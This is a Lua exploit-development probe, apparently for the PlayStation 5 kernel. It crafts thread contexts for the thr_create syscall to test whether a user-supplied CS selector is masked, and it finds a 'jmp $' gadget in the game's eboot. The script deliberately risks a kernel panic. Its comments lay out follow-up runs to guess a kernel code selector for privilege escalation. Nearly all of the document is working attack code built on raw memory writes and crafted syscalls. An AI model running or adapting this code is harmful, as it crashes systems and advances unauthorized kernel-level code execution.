-- CRASH_CLASS: RISKY
-- PROBE 189a: does set_mcontext() mask the user-supplied CS?
--
-- Vanilla FreeBSD writes the new thread's trap frame as
-- `tf_cs = mc_cs | SEL_RPL_MASK`, which forces the two low bits to 11 and makes
-- a kernel selector impossible. The 13.60 decompile suggests the PS5 copy loop
-- stores the raw value, but that reading has never been tested directly: a
-- zeroed context panics either way, because selector 0 is invalid and selector
-- 3 (index 0, RPL 3) is the null descriptor.
--
-- CS=0x40 separates the two readings, and nothing else does:
--
--   mask present   -> 0x40 | 3 = 0x43, the same user selector that works, the
--                     thread parks and this probe keeps printing
--   mask absent    -> 0x40 stays 0x40, index 8 with RPL 0. Its descriptor is the
--                     user code descriptor (DPL 3), so the iretq that starts the
--                     thread faults in the kernel and the console panics
--
-- A panic here is the price of the answer: relaunch the game and the probe can
-- be run again. Everything else in this file exists to make that one line
-- trustworthy, so A is a control that proves the harness works on this run
-- before B risks the console.
--
-- Consequences of the result:
--   mask present -> the user ucontext cannot name a kernel selector, and the
--                   thr_create defect is a panic only
--   mask absent  -> the selector is ours to choose, and the next question is
--                   which GDT index holds kernel code (0x08, 0x10, 0x18 are the
--                   candidates in a FreeBSD-built table); each wrong guess is
--                   one more panic, so they are tested one per run

print("=== PROBE 189a: CS SELECTOR MASK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_create = make_syscall(430)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100

---------------------------------------------------------------------------
-- [0] identity and the eboot park gadget
---------------------------------------------------------------------------
local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

-- Bytes checked by hand in 156d/160a; verified again here so a different build
-- cannot silently park the thread on the wrong instruction.
local jmp_self = eboot_base + 0x15481
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[0] jmp $ mismatch at " .. q(jmp_self) .. "; aborting")
    return
end
print("[0] park gadget=" .. q(jmp_self))

local function page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do wq(p + off, uint64(0)) end
    return p
end

-- cs is the only interesting knob: RIP is the park gadget, so a thread that
-- starts never returns and never writes anything.
local function spawn(cs, ss, rip, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, cs)
    wq(ctx + C_RIP, rip)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, ss)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf), ok, rv
end

local function canary(tag)
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    print(string.format("[canary %s] ok=%s pid=%s", tag, tostring(ok), tostring(pid)))
    return ok
end

---------------------------------------------------------------------------
-- [A] control: CS=0x43, the selector every thread probe since 157a has used
---------------------------------------------------------------------------
print("")
print("[A] control, CS=0x43 SS=0x3B")
local stack_a = page(0x38)
local tid_a, ok_a, rv_a = spawn(0x43, 0x3B, jmp_self, stack_a)
print(string.format("[A] tid=%s ok=%s rv=%s", q(tid_a), tostring(ok_a), q(rv_a)))
canary("after-control")

---------------------------------------------------------------------------
-- [B] the discriminator: CS=0x40
---------------------------------------------------------------------------
print("")
print("[B] discriminator, CS=0x40 SS=0x3B (panic here means no mask)")
local stack_b = page(0x38)
local tid_b, ok_b, rv_b = spawn(0x40, 0x3B, jmp_self, stack_b)
print(string.format("[B] tid=%s ok=%s rv=%s", q(tid_b), tostring(ok_b), q(rv_b)))
if canary("after-0x40") then
    print("[B] MASK PRESENT: 0x40 was accepted and the process survived, so the")
    print("[B] kernel forced the user selector (or validated CS). The ucontext")
    print("[B] cannot name a kernel selector; the thr_create defect is a panic only.")
else
    print("[B] the call returned but the canary did not answer; inconclusive")
end

print("")
print("=== PROBE 189a DONE ===")
